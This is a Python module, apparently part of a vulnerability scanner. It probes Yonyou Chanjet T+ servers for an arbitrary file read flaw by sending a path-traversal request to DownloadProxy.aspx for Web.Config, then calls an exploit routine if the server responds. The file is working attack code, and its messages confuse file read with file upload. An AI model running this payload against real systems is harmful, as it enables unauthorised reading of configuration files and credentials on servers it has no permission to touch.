import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging



def 用友畅捷通T_DownloadProxy任意文件读取漏洞(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "multipart/form-data; boundary=---------------------------33007515338361897914262830846",
    }
    exp_url = urldata+ 'tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../Web.Config'
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.post(url=exp_url, headers=headers, verify=False)
        if response.status_code == 200:
            print(Vcolors.RED + "[+] 畅捷通T+17.0任意文件上传漏洞存在"+Vcolors.ENDC)
            exp(exp_url)
        else:
            print(Vcolors.WARNING +"[x] 畅捷通T+17.0任意文件上传漏洞不存在" +Vcolors.ENDC)
    except:
        logging.error("用友畅捷通T_updata_任意文件上传脚本出现异常")



